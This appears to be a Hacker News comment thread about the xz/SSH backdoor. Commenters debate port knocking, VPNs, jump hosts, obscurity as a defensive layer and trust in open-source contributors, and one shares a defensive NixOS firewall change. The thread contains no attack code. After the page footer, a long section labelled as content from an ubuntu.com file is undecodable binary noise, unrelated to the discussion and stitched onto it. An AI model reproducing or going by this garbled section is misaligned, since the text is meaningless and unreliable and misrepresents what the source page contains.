| |  |  | [PhilipRoman](user?id=PhilipRoman) [9 months ago](item?id=39898537)   | [root](#39896572) | [parent](#39898466) | [next](#39897086) [–]  Huh, I briefly looked at the documentation for UsePrivilegeSeparation option and it looks very similar to what you're describing. Interesting why it didn't prevent this attack. | | --- | --- | --- | | | |  |  | [teddyh](user?id=teddyh) [9 months ago](item?id=39919388)   | [root](#39896572) | [parent](#39898537) | [next](#39897086) [–]  Note that UsePrivilegeSeparation is no longer an option; it is mandatory since OpenSSH 7.5, released seven years ago. | | --- | --- | --- | | | |  |  | [TacticalCoder](user?id=TacticalCoder) [9 months ago](item?id=39897086)   | [parent](#39896572) | [prev](#39898061) | [next](#39897376) [–]  > Stuff like this is why I like port knocking, and limiting access to specific client IPs/networks when possible. Indeed: I whitelist hosts/IP blocks allowed to SSH in. I don't use port-knocking but I never ever *criticized* those using port knocking. I do really wonder if people are still going to say that port knocking is pointless and security theatre: we now have a clear example where people who were using port-knocking were protected while those who didn't were potentially wide open to the biggest backdoor discovered to date (even if it's wasn't yet in all the major distros). > ... does the entire internet really need to be able to SSH to your box? Nope and I never ever understood the argument saying: *"Port-knocking is security theatre, it doesn't bring any added security"*. To me port-knocking didn't *lower* the security of a system. It seems that we now have a clear proof that it's actually helping versus certain type of attacks (including source-code supply chain attacks). | | --- | --- | --- | | | |  |  | [bpfrh](user?id=bpfrh) [9 months ago](item?id=39897571)   | [root](#39896572) | [parent](#39897086) | [next](#39898275) [–]  >It seems that we now have a clear proof that it's actually helping versus certain type of attacks (including source-code supply chain attacks). So would have a vpn or using a bastion host with a custom non standard ssh implementation... At some point you have to make the choice to not implement a security measure and I would argue that should stop at vpn+standard software for secure access. If you are a bigger company, probably add SSO and network segmentation with bastion hosts and good logging. Port Knocking doesn't add any security benefit in the sense that there are known non avoidable security risk aka your transmit your password(knocking) in clear text over the network. You also add another program with potential vulnerabilities, and as port knocking is not as popular as e.g. sshd, wireguard, maybe it gets less scrutiny and it leads to a supply chain attack? Security measures are also not free in the sense that somebody has to distribute them and keep the configuration up to date, even if that person is you, that means syncing that connect-to-server-script and keeping it in a secure location on your devices. | | --- | --- | --- | | | |  |  | [marcus0x62](user?id=marcus0x62) [9 months ago](item?id=39898338)   | [root](#39896572) | [parent](#39897571) | [next](#39897634) [–]  > Port Knocking doesn't add any security benefit in the sense that there are known non avoidable security risk aka your transmit your password(knocking) in clear text over the network. This take is bordering on not even wrong territory. The point of port knocking isn't to increase entropy of your password or authentication keys per se, it is to control who can send packets to your SSH daemon, either to limit the noise in your logs or to mitigate an RCE in the SSH daemon. The vast majority of potential attackers in the real world are off-path and aren't going to be in a position to observe someone's port-knocking sequence. Is VPN a better solution? Maybe, but VPNs, especially commercial VPNs have their own set of challenges with regard to auditability and attack surface. | | --- | --- | --- | | | |  |  | [bpfrh](user?id=bpfrh) [9 months ago](item?id=39898551)   | [root](#39896572) | [parent](#39898338) | [next](#39897634) [–]  >This take is bordering on not even wrong territory. The point of port knocking isn't to increase entropy of your password or authentication keys per se, it is to control who can send packets to your SSH daemon, either to limit the noise in your logs or to mitigate an RCE in the SSH daemon. The vast majority of potential attackers in the real world are off-path and aren't going to be in a position to observe someone's port-knocking sequence. If you read my full sentence in the context it stands, I argue that authorizing access to your openssh instance is done by sending an authentication code in cleartext. It does not matter if that authentication code is in the form of bits, tcp pakets, colors or horoscopes as long as your transmit that in clear text it is in fact no a secure mechanism. Yeah but now you basically have to always run an vpn that only exists between your server and your client, because otherwise your clear text authentication code is visible and at that point just use wireguard and make a 1-1 tunnel only for ssh with no known attacks, even if the attacker is in the same network. Yes a vpn that has no known reliably attack vector is definitely better than a protocol with a known working attack vector | | --- | --- | --- | | | |  |  | [marcus0x62](user?id=marcus0x62) [9 months ago](item?id=39907392)   | [root](#39896572) | [parent](#39898551) | [next](#39897634) [–]  > If you read my full sentence in the context it stands, I argue that authorizing access to your openssh instance is done by sending an authentication code in cleartext. I did read your full post. Your claim that port knocking adds no security benefit is just simply incorrect. Even if you take for granted the scenario of an attacker who can recover the port knock sequence, there is still the benefit of shielding the SSH daemon from other attackers who cannot do so. Which is…a “security benefit.” Describing the port knocking sequence as an extension of someone’s authentication key is where this goes off into not even wrong territory. A dynamically controlled firewall rule (port knocking) is not fungible with bits from an authentication token for the reasons I’ve already outlined - the benefit is limiting network access to the daemon at all. > Yes a vpn that has no known reliably attack vector is definitely better than a protocol with a known working attack vector You talk about recovering someone’s port knocking sequence as if that is trivial to do or in any way reliable. It is, in fact, neither of those things. An attacker would have to either: 1) sniff network traffic in front of the server 2) sniff network traffic in front of the client 3) compromise the server 4) compromise the client 5) brute force the port knocking sequence without getting locked out. Most attackers are going to be in a position to try brute forcing — that’s it. Meanwhile, you may not have noticed, but commercial VPNs have suffered a steady stream of high-impact CVEs for the last few years. Wireguard is certainly better in this regard than any commercial VPN I know of, but it does have challenges with regard to key distribution/device enrollment, and thus from a practical standpoint limits access to pre-enrolled endpoints, which is a limitation someone using port knocking does not have. | | --- | --- | --- | | | |  |  | [tredre3](user?id=tredre3) [9 months ago](item?id=39897634)   | [root](#39896572) | [parent](#39897571) | [prev](#39898338) | [next](#39898275) [–]   ```     You also add another program with potential vulnerabilities, and as port knocking is not as popular as e.g. sshd, wireguard, maybe it gets less scrutiny and it leads to a supply chain attack?  ``` That other program is just a stateful firewall, aka the Linux Kernel itself. If you can't trust your kernel then nothing you do matters. | | --- | --- | --- | | | |  |  | [bpfrh](user?id=bpfrh) [9 months ago](item?id=39897728)   | [root](#39896572) | [parent](#39897634) | [next](#39898275) [–]  That other programm is knockd, which needs to listen to all traffic and look for the specified packets. Granted, that program is really small and could be easily audited, but that same time could have been spent on trying apparmor/seclinux + a good vpn and 2fa | | --- | --- | --- | | | |  |  | [rhaps0dy](user?id=rhaps0dy) [9 months ago](item?id=39898293)   | [root](#39896572) | [parent](#39897728) | [next](#39898275) [–]  I much prefer the approach I read about in <https://github.com/moxie0/knockknock> (use a safe language, trust basically only the program you write and the language), to a random port daemon written in C which pulls libpcap to sniff everything. To some extent knockknock also trusts the Python interpreter which is not ideal (but maybe OK) | | --- | --- | --- | | | |  |  | [Aloisius](user?id=Aloisius) [9 months ago](item?id=39899899)   | [root](#39896572) | [parent](#39898293) | [next](#39898275) [–]  In Linux, simple knocking (fixed sequences of ports) can be done entirely in the kernel with nftables rules. Probably could even have different knock ports based on day of the week or hour or source IP. [https://wiki.nftables.org/wiki-nftables/index.php/Port\_knock...](https://wiki.nftables.org/wiki-nftables/index.php/Port_knocking_example) | | --- | --- | --- | | | |  |  | [nick238](user?id=nick238) [9 months ago](item?id=39898275)   | [root](#39896572) | [parent](#39897086) | [prev](#39897571) | [next](#39897366) [–]  The advantage of port knocking to me is just reducing the amount of garbage script-kiddie scans. IMHO the design of `sshd` needs to just assume it will be slammed by garbage attempts and minimize the logging. I've heard of `fail2ban`, but banning does nothing as the bots have an unlimited number of IPs. | | --- | --- | --- | | | |  |  | [AlexCoventry](user?id=AlexCoventry) [9 months ago](item?id=39897366)   | [root](#39896572) | [parent](#39897086) | [prev](#39898275) | [next](#39897376) [–]  > say that port knocking is pointless and security theatre Who was saying that? | | --- | --- | --- | | | |  |  | [password4321](user?id=password4321) [9 months ago](item?id=39897467)   | [root](#39896572) | [parent](#39897366) | [next](#39897612) [–]  [https://hn.algolia.com/?query=port%20knocking%20obscurity&ty...](https://hn.algolia.com/?query=port%20knocking%20obscurity&type=comment) 20200515 <https://news.ycombinator.com/item?id=23187662> etc. | | --- | --- | --- | | | |  |  | [AlexCoventry](user?id=AlexCoventry) [9 months ago](item?id=39898091)   | [root](#39896572) | [parent](#39897467) | [next](#39897612) [–]  Thanks. | | --- | --- | --- | | | |  |  | [rdtsc](user?id=rdtsc) [9 months ago](item?id=39897612)   | [root](#39896572) | [parent](#39897366) | [prev](#39897467) | [next](#39897376) [–]  I've heard it many times in the form of "security through obscurity, lol! you obviously, don't know what you're doing". Yeah, it's a "straw man" pretending the person they are addressing was just planning on running telnet with port knocking. | | --- | --- | --- | | | |  |  | [k8svet](user?id=k8svet) [9 months ago](item?id=39897376)   | [parent](#39896572) | [prev](#39897086) | [next](#39897395) [–]  Over the weekend, I added this to a common bit included in all my NixOS systems: ```     -networking.firewall.allowedTCPPorts = [ 22 ];     +networking.firewall.interfaces."tailscale0".allowedTCPPorts = [ 22 ];  ``` I probably should have done this ages ago. | | --- | --- | --- | | | |  |  | [zoeysmithe](user?id=zoeysmithe) [9 months ago](item?id=39897395)   | [parent](#39896572) | [prev](#39897376) | [next](#39896969) [–]  Port knocking is bit like a lazy person's VPN. You might as well get off your butt and install a vpn solution and use ssh via vpn. The time and effort is almost the same nowadays anyway. The chances of both vpn and ssh being exploited like this must be zero. Worse, most corporate, public wifi, etc networks block all sorts of ports. So at home sure you can open random ports but near everywhere else its just 80 and 443. Now you can't knock. But your https vpn works fine. Also a lot of scary stuff here about identity and code checkins. If someone is some contributor, how do we know if their creds havent been stolen or they've been forced via blackmail or whatever to do this? Or how many contributors are actually intelligence agents? Then who is validating their code? This persons code went through just fine, and this was only caught because someone noticed a lag in logins, which by then, is a running binary. FOSS works on the concept of x amount of developer trust, both in code and identity. You can't verify everyone all the time (creds and certs get stolen, blackmail, etc), nor can you audit every line of code all the time. Especially if the exploit is submitted piecemeal over the years or months. That trust is now being exploited it seems. Scary times. I wonder if how FOSS works will change after this. I assume the radio silence for Theo and Linus and others means there's a lot of brainstroming to get to the root of this problem. Addressing the symptom of this one attack probably won't be enough. I imagine some very powerful people want some clarity and fixes here and this is probably going to be a big deal. I wouldn't be surprised if a big identity trust initiative comes out of this and some AI stuff to go over an entire submitter's history to spot any potentially malicious pattern like this that's hard for human beings to detect. | | --- | --- | --- | | | |  |  | [codedokode](user?id=codedokode) [9 months ago](item?id=39897645)   | [root](#39896572) | [parent](#39897395) | [next](#39896969) [–]  > nor can you audit every line of code all the time You can if you distribute this job among volunteers or hire people to do that. There are millions of developers around the world capable to do this. But reality is that nobody wants to contribute time or pay for free software. | | --- | --- | --- | | | |  |  | [nijave](user?id=nijave) [9 months ago](item?id=39896969)   | [parent](#39896572) | [prev](#39897395) | [next](#39897047) [–]  Jump host running a different SSH server implementation or SSH over VPN seems a little more reliable. There's a lot of solutions now where the host has an agent that reaches out instead of allowing incoming connections which can be useful (assuming you trust that proxy service/software). One place I worked, we ran our jumphost on GCP with Identity Aware Proxy and on AWS with SSM sessions so had to authenticate to the cloud provider API and the hosts weren't directly listening for connections from the internet. Similar setup to ZeroTier/TailScale+SSH | | --- | --- | --- | | | |  |  | [Terr\_](user?id=Terr_) [9 months ago](item?id=39897047)   | [parent](#39896572) | [prev](#39896969) | [next](#39897315) [–]  My gut-feel is that it rides near the line between "defense in depth" versus "security through obscurity". | | --- | --- | --- | | | |  |  | [Attummm](user?id=Attummm) [9 months ago](item?id=39897621)   | [root](#39896572) | [parent](#39897047) | [next](#39897303) [–]  While 'security through obscurity' shouldn't be your only defense, it still plays a crucial role within 'defense in depth' strategies. In the past, sensitive networks relied heavily on obscurity alone. Just dialing the right phone number could grant access to highly sensitive networks. However, there's a cautionary tale of a security researcher who took the phrase 'don't do security through obscurity' to heart and dared hackers, leading to disastrous consequences. Obscurity, when used appropriately, complements broader security measures. Take SSH, for example. Most bots target its default port. Simply changing that port removes the easy targets, forcing attackers to use more sophisticated methods, which in turn, leaves your logs with more concerning activity. | | --- | --- | --- | | | |  |  | [mrguyorama](user?id=mrguyorama) [9 months ago](item?id=39897303)   | [root](#39896572) | [parent](#39897047) | [prev](#39897621) | [next](#39897315) [–]  The reality is that security through obscurity works really well as a layer in an otherwise already good security model. You make sure to test it with some red teaming, and if they fail to get through, you give them all the details about your tricks so they can also test the actual security. The "obscurity" part mostly serves to limit the noise of drive by and bot'd attacks, such that each attack attempt that you end up stopping and catching is a more serious signal, and more likely to be directed. It's about short circuiting much of the "chaff" in the signal such that you are less warning fatigued and more likely to seriously respond to incidents. The obscurity is not meant to prevent targeted attacks. | | --- | --- | --- | | | |  |  | [Dwedit](user?id=Dwedit) [9 months ago](item?id=39897315)   | [parent](#39896572) | [prev](#39897047) | [next](#39897208) [–]  Going in through the main Internet connection might not be the only way in. Someone surfing on Wifi who visits the wrong website can also become a second way into your internal network. | | --- | --- | --- | | | |  |  | [noman-land](user?id=noman-land) [9 months ago](item?id=39897208)   | [parent](#39896572) | [prev](#39897315) | [next](#39897992) [–]  Got any advice to easily set up port knocking? | | --- | --- | --- | | | |  |  | [AlexCoventry](user?id=AlexCoventry) [9 months ago](item?id=39897447)   | [root](#39896572) | [parent](#39897208) | [next](#39897992) [–]  It's old and there are probably friendlier options out there now, but <https://github.com/moxie0/knockknock/blob/master/INSTALL> | | --- | --- | --- | | | |  |  | [belorn](user?id=belorn) [9 months ago](item?id=39897992)   | [parent](#39896572) | [prev](#39897208) | [next](#39903220) [–]  Rather than port knocking, I prefer IP knocking. The server has several ip addresses and once a correct sequence of connection is made, the ssh port opens. Since so few know about IP knocking, it much safer than port knocking. /s | | --- | --- | --- | | | |  |  | [drpixie](user?id=drpixie) [9 months ago](item?id=39900737)   | [root](#39896572) | [parent](#39897992) | [next](#39903220) [–]  Sounds like (another) good reason for IPv6 - your box can have many, very obscure addresses :) | | --- | --- | --- | | | |  |  | [duckyoufan](user?id=duckyoufan) [9 months ago](item?id=39903220)   | [prev](#39896572) | [next](#39896549) [–]  So many important points in dead and downvoted comments. Who the hell runs this site? | | --- | --- | --- | | | |  |  | [otterley](user?id=otterley) [9 months ago](item?id=39906291)   | [parent](#39903220) | [next](#39896549) [–]  I’d recommend upvoting and commenting on the important points and adding your own useful comments. | | --- | --- | --- | | | |  |  | [Joel\_Mckay](user?id=Joel_Mckay) [9 months ago](item?id=39896549)   | [prev](#39903220) | [next](#39895866) [–]  Too bad, for a minute I thought it was something useful like adding a rule to clamav to find the private key-pair signature ID of the servers/users that up-streamed the exploit. "Play stupid games, win stupid prizes" | | --- | --- | --- | | | |  |  | [supriyo-biswas](user?id=supriyo-biswas) [9 months ago](item?id=39895866)   | [prev](#39896549) [–]  All these efforts are appreciated, but I don't think the attacker is going to leak their payload after the disclosure and remediation of the vuln. | | --- | --- | --- | | | |  |  | [chonkerz](user?id=chonkerz) [9 months ago](item?id=39896589)   | [parent](#39895866) [–]  These efforts have deterrence value | | --- | --- | --- | | |
| |  | | --- |   [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |



=== Content from ubuntu.com_897b4a24_20250111_034040.html ===
�V  �Ҵ�?��R����r)5�!4��"P����ߘ���D��}Ě�7�%T-� �ס�'K��I��P��Q�2%�%"��+�Z[��l/`���E�v:k�u�S����I�V"��m �lK��H�ZؤdR �������c5d�I�c�PE�~���kj�ܮT�k0���#�Q�e �m���� ��I�1��"�4�+7JZo��ƜJ6�(
+����O������"���|7/R��aZ����X���F�WI~IN�w3�l�IÂ<(Fr��z��=WDZ�������2V�i�#�r^N��\�.,�kE�{^f~�0L�$W����ϫ��w[�8�֬�4�Y�'��I���h�ч�ZU�rj(0-
HX��n�JPJ0j��47^������Ee=����j4��1�>
4KC�)K����j�nB/��`;.[�@ i
R��rI��a(�t��W��xɊ6h��e5-�(�x�v�tӱ\_;�֢^�S#����ď��H�,΃$ 56�"����#�Z����7�T-+O��A�;��z� � nLC�GVp�`p��e���� P�b���V�V�;F��f^�D��x�^lrߞ~�}��.\_����Q���W�ŷ}������g���z��\_:�5�\}��:��5 �L����nјȇ]�]��fߦ�Mp1L.~����Cv09?x:�x�7��)��wt���� ��IHi�� ���x�ۀ�Ɏ^G�
����ZDf�Y@)(��y�����p�@\*A�d|A!1���� ��\*�)��{�B�Y�w�q
>6c5n�zL������7�^W/��ǟ�����ϒ�?\_\_�BG�/��?ݿ���~�9r���>�Y#G���#Q�I����i�AK��U��"�\[i�%K�s6���윱�VL�hw�BO��T|�c�nMRM�$P�0�s�%����e�d���\*�'p:�z���?��Ɇ�:�fD:���[���+�J�Om?8�����Jн��ˤB���xw�²U!��Z�-��\��T�V�~G?�xE}Z���M��I���ރ�hɶ��5���I�B���\_W^��2�mU@'Ϟ?}��)è9����┋�����-�\*����SO�6F�z��;���z�<8�T$��Te�n~ڍ��6���v��� O��a�a���r��'��Y����^���ݗ���x�ė�o�p�DE{5��k�c�}�W\_�c -��)�g���C��%�Dx��3$�v���]7['޳Y����~,��{RdV�����M,]��ڷ��2��
��Dm�}\*�j�0�˛���v�����`�@�P����#�㝀�8��H�i����XJ�H1��1�
�S0� �[���$��#�
#b�3|�1���;S �k����ƹ��/���Ú��?��7��a��}�����J�1jj����)c{����wK�/�c6���H�Ts
�5<�yTIs4�.U�M2��?�]���DS#;�9��Hehv�M�w:c뭉kߥu��f�1�"�e%Ld�O�fcuF#�!
�S3PC���x�d�$.�چҒ�3��A��B�:���0A�K{8��\_2�9�T"� ېҌ\_�^۔D�|<��?�q8���wQ�w{ĴJ P�>�FX��b3�F��5�j�#L�]���f�J�)\\*�D��NxG!�0α�w������9���I�2Q�� yT�����1ɟ3��J6B��J$�2�HPZ��d�����T���aXٸ���i���s�u����Ma8�D��zfm�Kd�D ]ܴ a����J��c�%�ǵ����,qX}������>��x� ���ǩT9�Nap�Y(��2�9�����xx�Wi�w+Qƌf9H�-��P�p�U�rl�<��i�U��huQ79�K-7D�c��E��%H�R�N�Q�,^�?=679:/�� Ե�
�wrr+�Mw�d�a�wxr�������vޑK�
����օ�
��=��/��. �&�3)k�`
�T��p.��@B�����Y��w�X�7���d�V\_�VrEH�A[M��L�w �L
-:\5�g:7Z�G���t�4�$'�^�Q��0W#rR/1���R��"���9r��kBN\*I�M�F��#���EN'���; �l�P��6@��Ėڇv��eX��oV;�2u|U�S~t�4'4��?�UE1�gޢ+:��]a\*3�i���ywQt>�d���p�XDR�0a��������Z����GҮ�'�����iM��TD$���~uo��8;�E�=kV~\��M���I��5J�ᣛ,�>/�>�d���Hg'f�$�ڼ�����s;���.��+RQ��DJ\m������N��נ���6�p��H�Z�/6�t���݉x+%�3��3k
�����J)�˥|�M� �o�7PDӸ�{�"��5�;3�Х�ip:�o~�6 �+!�Zel�Q��յqںᓬJ�N�D���)fٱxQ�4�n�jЀ[/b�k���rh��;Xp�mf�!�C~o.��^�O'uq
�\*�8���X��\_�fe��$���0:U��v����Q�te�Ol�H�+K�O+�h�6����V�&kg[M�B]Б�8��^?��'ų't��G�(<,?�M�iHs�����n�0�qwf��'g�x�(�-��ӌ�
��A�b`W+�c�n�5���m�'f�|y^����Gp�| � ���e'�4�j��;ON�"�\_`}�g'�,�!�NP8ʖ\�t�'���z�pJ���ƙS�j �� @6Um�2!LaR��u��"!Gz���~�~����a�T�6��;���̓j�Z!҉�=-J�1�U�ZAA�t��>W��`�l�J�ヽϜU�)�ԟ�l��]�:�@ά�h��!��� C�ܻah0a��;��d[����ux���ph��Þ[R�q���௫��"�:�.r+�~�P��������)��D4��RaB��L�(�+L��d�4�s����5ICc���~��z�^l�[A/,�ϔ1�I��[��H�����3�R������\_�R�`ȡy&H,T�W�&vn]��e!xi��U�Jԣn�ڥ�ސ���K\�7 ��wn]��e�h��nk��l�>�[�$$|Z�bX�``i.%8�f�ܺ�����).�m�%T�����
�X�SJ���Z�����E���g�Ab�Vt�H���LqJ��9�v�:1]E�k��%�������"(LT>��� ��]6�������)��#mO��oV��7�sO���8���Ÿm>�.F�a�ճR��OE��X5V���P�r�S�0Tq���\_m�Cv����B����g�(��=2����[7�i !�L.�#�� s��(�� �\* ���^�������u��!�/&��(B�LF�ukHv�����P�n��9+$�M��&N2`��td�Zk�K���s�U3��kt�q�,x��q}���� �����$ِAh
 ��5��z]�?(��[�b���bR�P�H\*j�fkRt�Z;�1�v�%���P��7�YW�Fӆr������ �y�U���N��b��񋶐v-iy�yS�8�'k
+�`� &��}z�ZqWg�f�N����N.񕽝/;�|P���:��?\*�K��^^z������]���9v�h��xT`�hO�\_&��=��i�j;䀀��8]5�;��)6�����)�i�G�1�B���l�,�~�ǣNA8���g�zT��A~$[�O٧��R���z�~P?�!������� ?P�aW�,vvs鳛"��� ��x"�U���\*�9�����$�]s�+Bi��.c�^q�m�/L~�SnX�AQ�ˑ�%M����� ���)�t.�\*����h �� @�l���˩C�rz�m%d��rt
� DI��c�B�D��Jj3Td{�E�������P+˕�w���1�nsZo�H���$Y�o��ÏM] ں��j1��޼�EJ�����Vw�Ӏ!��S���陸�%��(b��?09�I�g�+bc|�g���,�x;�7%��٠K+3��Qm�!U��y��1���`j��&�Ig�z��wt���E�.E�Y,��d����=�d&��)\�TXN�}�Rn����{��j��"���}�/�����|�����{m���a��\_��򔩿0�fj%x���FNR`��.%y$�S͙A��(�^ؕ�s�Q�� �5/�yU8{��>�|�c8����7T��w�\��h���ƾYiV�C����@d��� =ޜ��X������SϘ/A��"I���T6U����k�Ql1�B�- Q��tv�v}��q�D���
S���n)E�?���5��!�@^��>9v,+oȇ������d�\G��6\*�� �OV��~\_����2�m>�m|�e�WS��]h��ũʎ�� �W��uj�OW���\_���l]�\*S�!�� ��ꓗ��
�w�羴e%�+H�>��~Ų �!e{�M�B��a�->�Ei8�i��m� u�^Q-S�D�gZ��G��D��9;�:2��%��sx��ё2�3Gޢ�/�I��9���\[����o�C��P+m,�F
G��n=`b;��r � �a��o��o��֕O��e��/vsd�@�R(a4�\�J�\*�r�$�8"�V>�V2���-��P�D�`��3l)782~$~�ڶ�L$��Fb�t�9-k��f�f��M�$]�U��X���,�1��߯!
��q�O��7���K�J��XA�pwS�F��\_�WC
@�K$��"ߧX֋&ǀ�"v���P\*b��1�\��z���8"Y0�f�\_٩Q?F�4��ո?�=��4R^|b
������5�/0���
fMm&��
�\_��i����Ǻ`�e)y�W�'\*��/S\_��ʽv�Mp��m��� �ؤ���%���Z��} �jlF�b1��UX�,""��(㭜Ɗ?��!=F��=��1���T�M���Y@I>���ĝZ��ʎ�P�1y\_,�]3֕�� ��I6�����k��E��#��ro��Ծ �Xˉ�1'�Ht�ˢi�sF|�&�V�k�
����leB]= �XG?i�1Fe�qZD�vK#Tڈ�7���h[�L�-Y�;����hė����+���m��ʿR�Wl��� �ck��U �!�1����m�7?4/=:db��AZ���4!,(.AW��j�G(`��G��!v56G��N�Oܖ�N� ����C�yӣfF��q`#t����(�M]���|�]�tƬɴ�7���̺�UE�u�W6�E���}�M�5��?/���
O��@&�L�mI�"fGj�C�h�"�Ny�w�g�}�"��id���ZbP���3��I�S�䑰�4�H��h�o$�s�-��$� ��� �(E�e�Ͼ%�"���]���f�Kof��/�` }��\�kA�cV�`�.��0dWB�I�ɰ�t���vѕ>��-�#�"� =Zo�"kZI�������6wn�X��z���ˮ��wE[;s8����
��n��!B��b�)�@ٺH��jO�\���jO�ʭ������JcRAgw����/Q7s��b��;�\_���#"�n#�����$6/{\_9���jf5h3�$�=�Oj��&�Z�� @6u�w�tٝ>aiz�Y��T1����߯�}k{��Հ��3�μ�h�J5 B#6j�?tq&�� R�Rl�:��б$����:�H
�`�9�VMel�ʵ'SA�
�h�6�h`^(��Gt![�2O����,���A��~(�se�[z������S��?M½K�u�&�;0���7��W�c�t��>��v��!�\.b���1)�m����6?�Ml����)�c�Zl~����F̽�g���H'�̓�o����Z�?vo����/7�|�H�h��v�q}�I��I�+f��N�pޯ��������fz�?�w2��]�.xl����] ��~>����G���0�"q�������a�|A�R�Տ�4��5\*�\�b��IN�f���t@���+�CT�8�����%s�O@�}�~s������� f5�c���l�c{Hnױ��!�?��k��?:��o���㱧��M�N�眔�Ӛ|8
T�A](�P�n��u9A�}��\����!s�hA��`���ϥ4��!`
}7�RpDP4��T�������"o�rK`�r(��h�YXJ#\*�������P�
\*%�B{nq"��d@F]+���Mlb��3��a�HJ�A(��9W�Y��/�!V��l�B:+V�|6���� @.��ߟ׆kxI�\���;�)ת�س"q�v����@�Q�oeMZs�ݻ�����qR��M@:\*�\_\*`0�]�m���H�0yZ|��Rz���V`Pu$���j�1jP$+::M�'4"
�8����(Y��������/0t֭@��� c�\���׎Z�X��ә�y���U�<�%�U����mZz�~����QY�έ)\*�ܤ&��QUCp`nVW(�Q%�<j%�����X?��?��������B�م�����<[�Y.�l&��Le3 ���:!Eu�;����z( �t%BC$��]�h�}��r�"����[W����E#�8�� �R�/�o�#�R!��\*n�^�V�kmġ�N����O���;.וE��[�w񐶕�����%ICO���������CM7���o{�h�\*���UhW�|��r��auiE1��·���A�I�HȅB�^X���~ �t8�Hߋq����2 �dW��G�����3))k33x����e$R�"��u/ZN�����-֩Rܩ�8%(�J\_�4�zȇ��@O���������"�p�E�P� =��x�Qh��n�%���E�զ\_��ڄ�\_��$\�ҷ?�á\�����8,�VXd���\*b���@@άS��@�� q#j��+@w���l� Ⱦ\�f����1�;��o3G\dh�~�h\_��r��'�w�����w �O� ' \_j�ܓ��ϒ��Rj�nqi^DR�b��
s6�j�A9��rz!�H��\jT2� aՃ
�马�(ĵRx|���><�\*�9Dn�Y������ ��ܮ(�~G\�̑p@��1�d�Q=��M�^�����$���ҙ�o��e��)��lМr�t`�������1T��lvő���(�XYc�ò���؍$�M}�M�2C��5��v���~
�lj�C�bqސr�J릲��@��10O�c>xA>p�15��[� ���w�,��fY�f�����[��2�h�j$'i%���+K��}�R(&�:�n�ȇ����)���i[�d0�T�˯C<��B25�y\*ZR�I�ػ?'�5`�u���t>�z�EJ h6QF����b��l
+�;����SM�gq�z�K��r{�q������+H��Gx��\_�NFv���N� ���r�FoY���D��'��Ι �+i�qM%�ȣ�tO�;{�����wT| ��v
���{p��rGm�Ƚ�y!��q6Z�=so�a�T
��Rgr�/Ȭr��$^��rE��%54BV����y��nGv)���`�z�ඏ�烠'�Hq�iLc��=j�+؃ȫ�U8�I,���]S�Ye��Чj2+^uO��Q�����������C�eɬ�R�4]�=��J�yw�˦3�);>�)�8�
��?9��
Ӵ�@�l��Ӵ�DI��ڡ��V��T�A�h�H-�IQ�\*��\_'O��z�� 7���Q�|Q�ع��c��~9��� @V��d�G�C�@��U�g����}]����������I�V�����fA�� |V���Ű�'�രy���k��nA}��J���1��# ��c�Eu�lA�;�m�)λ�i���CL��[?aH���%q~��a����!q4XP2�X����F�\*|`Hq�dL�9�[W��|�rRѸ�i��-��;6)e�)�J�i�+����ӑ, �0�1��x�n��W�+ ���c1WUH�Q�f��M,�ex������1��n����n��b��^i����hA@ YZ�f#�e����`��>��nS�K$U�`�E�-���;��n��Ώ|,�-j�I�J5�4�RS�O%�ԙ.��q(��B��k
��l�B-���˾������zL}��Sk���>8�� �3Tp�y��;��V={��buQ9��Ԩė�}5�,I-�gM�������!�c����������a�ɁcqeY��LjT��QX���������=rҔ��<��\�%��[��ȸt��r��ɘ\_,�]͍^����^�(���',�֡��z`��$��R���ۍ�F�CT��E�j���P��d�b����͏��7%���kdx���]�zUҫ�n�3w��#9�N��� @6��oT.�Wav �B�]��M�Sg��PJ��+T.���͢�?a�[Z�ϖ�&�C�x<Т.rZ��(f�H�n�u��6 �����++9�]ݩ���p��o� �z꒜F�����;d��F�����hd��b�YaHV"�4D"��u\_�%!�:�J˴�F�i�$��!W�d2��i��'���u-U^ �?�Iw՚�#=.[��z���.��f"��H�c�@X�;T�x����(q� z�A{�R�.r>9���w�J��|���x��K�"�v(FQ��\_��jځ��ݨ���]cgP�D�)�۲��^��$#��[�S�&(^(9��t�R�B�r�wg�{��:��
$l>��UB���{6S%fE<R��0�x�l13���|���'��|���%�l�M 6 �=yI�)go��&���K̰=�z#���t��[��@���i˦Π�S��
[�
�:yx��V������,l��O`�U���h�]6
�^ ���kFF�3h��EV�\_�)�a�x>l�u����G�Ԣ�qbu�2ِ�#���n,
^]�@ӓm:c��Gq��͘������T���I�Z����'�}
�Y��1�К�B�8\*��c��~]�MXIؼ� 9�ȱ��
�s�Ʃ9�~ʨ%W
kL���S�g�4��˪@ܭ���K,]5����X�3��L��i�)\�+� ��a�ȃcSi���� @��Y�5ՎPD?c�8����c9t�~��L�B�uBZ�%B����'�w�k/]hZ�~����^ҴS��A����(��HL�5�g�Ȕ�l��j�`ƌy��뙤�"$Hn�X��~W�H�ļ���w�a�:�p �-6���:�?�F$�D$Q]��Z���w�ѐL���a,�o�vUڱ'͜�d$CG�c�j�o}3g��JF��]�;n�0��~/)�U�mi�w|ݲh��o��X�����}���k�[�N����չ;��8T�E��\_�4L>��a����k�`�b��W��eВW��ᐖ;[��F~��f��[�ͅE�?˖Ḥ�ITW+�6���k�0�j� ��d�\*f\*�-��}�m�����
�][ȇ�8թ�7ʯ�� O�\*a8��xڱ=�[{����
@B�7������Ҩ
��b�=�ـr�k�Tm����;�=|�ˆ4os��S�08��5Ea,��T+��qi~��V@҉0��Rt�~��%H�l؝E����y��,����^bO�.[��0B�q�:4���a�k�d9ɹ�>��s�f�Y�8|����z�\�0�K�%�\t�|OPB^ϛ�Pv�IF�%��}�o�uI���ްcD�`�E��u�u�hc����C]B�:�]�3�+�A�����Y���JK��/�}��?���m����d!
�(�n����#j��u|��m������j&�E�p9�πinnf�W����4Y�j���5�}=��@��o��P����BۯD�^$4�(<<��598��=g����G��.:d�޼���+q�F���o��P���Ň�2߆������"\*^��г/TX�R/³>���m}�<�K�}f��K��AOD�KP�{�"������Jo^����"�\_`�K��Xo\_p�/~�>������!@\�s~�u����߸������^����D3����7\_}��\_���"��eVXD��%}��L
�=n���Y�'�?Y�?��S���{�O%�4C�\*�~�R��E}`#���F��hU2�-<��L�g���Ԧ%b��60U/t��"z�\_/��t }jl05֓��
��DG��a��kёo�����W/"�^r
